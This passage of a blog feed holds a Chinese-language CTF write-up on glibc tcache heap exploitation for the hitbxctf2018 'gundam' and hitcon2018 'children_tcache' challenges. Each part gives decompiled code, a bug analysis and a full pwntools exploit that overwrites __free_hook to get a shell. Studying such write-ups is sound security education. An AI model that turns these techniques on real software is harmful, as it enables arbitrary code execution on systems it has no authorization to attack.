class="number">1</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 3</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line">developer(<span class="number">3</span>,p64(one_gadget))</span><br><span class="line">withdraw(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitbxctf2018-gundam"><a href="#hitbxctf2018-gundam" class="headerlink" title="hitbxctf2018 gundam"></a>hitbxctf2018 gundam</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 . Build a gundam</span><br><span class="line">2 . Visit gundams</span><br><span class="line">3 . Destory a gundam</span><br><span class="line">4 . Blow up the factory</span><br><span class="line">5 . Exit</span><br><span class="line"></span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1022(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        bulid();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        visit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        destory();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        blow_up();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Exit...."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单功能如下：</p><ul><li>Build：申请一块0x28大小的chunk用来存储gundam的结构体 <code>struct gundam{ int inuse; char* name; char type[24] }</code>，其中<code>name</code>为0x100大小。最多创建9个gundam。</li><li>Visit：打印gundam的<code>name</code>及<code>type</code></li><li>Destory：free指定gundam的<code>name</code>，没有清空指针，可<code>double free</code></li><li>Blowup：free所有已经destory过的gundam，并清空指针。</li></ul><p>思路分析：</p><ol><li>第一步依然是泄露libc地址</li></ol><ul><li>本题我们不能控制malloc的大小，因此不能使用上一题的方法一，只能使用方法二。本题最多可以创建9个gundam，很容易就能把<code>tcache</code>填满7个，之后的free掉的chunk就会放到<code>unsorted bin</code>。接着使用visit功能泄露<code>unsorted bin</code>的fd即可。</li></ul><ol><li>使用<code>tcache dup</code>进行任意地址写</li></ol><ul><li><code>tcache dup</code>类似<code>fastbin dup</code>，利用的是 <code>tcache_put()</code> 的不严谨可以对同一个chunk多次 free，<code>tcache_put()</code> 的检查几乎等于没有，fastbin不能连续释放同一个chunk，而且还需选择大小合适的位置，而<code>tcache</code>没有这种限制，使用起来比<code>fastbin dup</code>还要简单。使用destory功能进行<code>double free</code>后，接着新建两个gundam后即可分配到指定位置，修改<code>free_hook</code>为<code>system</code>或<code>onegadget</code>即可getshell。</li></ul><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./gundam'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bulid</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name of gundam :'</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">'type of the gundam :'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Destory:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    bulid(<span class="string">'aaaa'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    destory(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    bulid(<span class="string">'bbbb'</span>)</span><br><span class="line">bulid(<span class="string">'cccccccc'</span>)</span><br><span class="line">visit()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># tcache dup</span></span><br><span class="line">destory(<span class="number">1</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line">blow_up()</span><br><span class="line">bulid(p64(libc.sym[<span class="string">'__free_hook'</span>])) <span class="comment"># 0</span></span><br><span class="line">bulid(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">bulid(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">destory(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcon2018-children-tcache"><a href="#hitcon2018-children-tcache" class="headerlink" title="hitcon2018 children_tcache"></a>hitcon2018 children_tcache</h2><p>题目功能不多，就3个，我们来一一分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊    Children Tcache    🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   1. New heap           $</span><br><span class="line">$   2. Show heap          $</span><br><span class="line">$   3. Delete heap        $</span><br><span class="line">$   4. Exit               $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  sub_AEB();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid Choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">new</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单功能如下：</p><ol><li>new：创建一个heap（最多10个），可控制size，由于使用了<code>strcpy(dest, &amp;s)</code>（把从src地址开始且含有NULL结束符的字符串复制到以dest开始的地址空间），存在一个<code>off by null</code>漏洞。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2034h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-2030h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-2028h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-2020h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2038h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x2010</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_list[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  get_str((__int64)&amp;s, size);  <span class="comment">// 有00截断</span></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);   <span class="comment">// off by null</span></span><br><span class="line">  heap_list[i] = dest;</span><br><span class="line">  size_list[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>show：打印指定index的heap</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v2 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  v0 = heap_list[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(heap_list[v2]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>delete：free指定index的heap，并且清空了指针。<code>memset((void *)heap_list[v1], 0xDA, size_list[v1]);</code>free前填充了<code>\xda</code>。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap_list[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)heap_list[v1], <span class="number">0xDA</span>, size_list[v1]); <span class="comment">// 坑点</span></span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_list[v1]);</span><br><span class="line">    heap_list[v1] = <span class="number">0L</span>L;</span><br><span class="line">    size_list[v1] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目分析：</p><ul><li>这题比较麻烦的是没有一个很直接的<code>double free</code>漏洞可以利用，delete的时候清空了指针。而比较明显的漏洞就是<code>off by null</code>，那么关键就是如何利用这个漏洞了。</li><li>由于分配的heap空间是连续的，可以利用<code>off by null</code>把下一个chunk的size值的最低位覆盖成<code>\x00</code>，同时放入一个合适<code>pre_size</code>值，把前面已分配的chunk伪造成一个已free的chunk，当free此chunk时会进行向前合并，造成<code>overlapping chunks</code>。</li><li>题目可以控制malloc的大小，因此选择创建一个可以放入<code>unsorted bin</code>的chunk进行libc地址泄露。</li></ul><p>解题步骤：</p><ul><li>申请两个大于<code>tcache</code>范围的heap，中间预留一个heap（<code>tcache</code>范围内即可）做备用，依次记作<code>#0，#1，#2</code>，对应下图的第2-4个chunk。</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104626-b8d4cd78-3002-1.png" alt=""></p><ul><li>把<code>#0</code>和<code>#1</code>两个heap释放掉，此时<code>#0</code>号进入<code>unsorted bins</code>，<code>#1</code>号进入<code>tcache</code>。</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104647-c574d0fa-3002-1.png" alt=""></p><ul><li>申请一个<code>#1</code>号大小的heap（<code>#0&#39;</code>），利用<code>off by null</code>修改掉<code>#2</code>号heap的<code>size</code>，还要改掉<code>pre_size</code>，当free掉<code>#2</code>号heap时即可发生向前合并，此时<code>#0&#39;</code>号heap将与<code>unsorted bin</code>重叠。</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104710-d3996e52-3002-1.png" alt=""></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104726-dc923192-3002-1.png" alt=""></p><ul><li>申请一个<code>#0</code>号大小的heap，这时<code>#0&#39;</code>号与分割后的<code>unsorted bin</code>的<code>fd</code>重叠，打印<code>#0&#39;</code>号heap信息即可泄露libc地址。</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104741-e5ba1e38-3002-1.png" alt=""></p><ul><li>申请一个<code>#0&#39;</code>号大小的heap(<code>#2&#39;</code>)，<code>#0&#39;</code>和<code>#2&#39;</code>将重叠，可以进行<code>double free</code>。</li></ul><p><img src="_v_images/20190204230419929_3880.png" alt=""></p><ul><li>跟着就是<code>tcache dup</code>的常规套路。</li></ul><p>坑点：</p><ul><li>由于delete的时候填充了垃圾数据<code>\xDA</code>，而且new的时候写入是有<code>\x00</code>截断，因此需要利用<code>strcpy</code>会复制末尾<code>\x00</code>的特点，不停改变新建heap的大小，然后删除，一字节一字节地把<code>\xDA</code>清空掉，之后才能正确填充<code>pre_size</code>。</li></ul><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./children_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'Data:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bins &gt; 0x408</span></span><br><span class="line">new(<span class="number">0x410</span>,<span class="string">'0000'</span>)    <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'1111'</span>)     <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">'2222'</span>)    <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'3333'</span>)     <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># overwrite next chunk size &amp; clean pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    new(<span class="number">0x28</span>-i,(<span class="number">0x28</span>-i)*<span class="string">'a'</span>)   <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># overlapping chunks</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x450</span>))  <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x418</span>,<span class="string">'1111'</span>)   <span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># overwrite free_hook to onegadget</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'2222'</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># 0 = 2</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x28</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line">new(<span class="number">0x28</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>tcache的安全检查特别少，利用起来比较简单，此类题目的主要难点在于如何泄露libc地址以及如何创建重叠堆块。这3个题目基本把libc泄露，tcache poisoning，tcache dup，overlapping chunks都涵盖，值得学习一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4102&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4102&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018年飞机上拍的照片</title>
    <link href="https://4f-kira.github.io/2018/12/31/2018-sola-photo/"/>
    <id>https://4f-kira.github.io/2018/12/31/2018-sola-photo/</id>
    <published>2018-12-31T14:12:26.000Z</published>
    <updated>2018-12-31T14:32:26.294Z</updated>
    
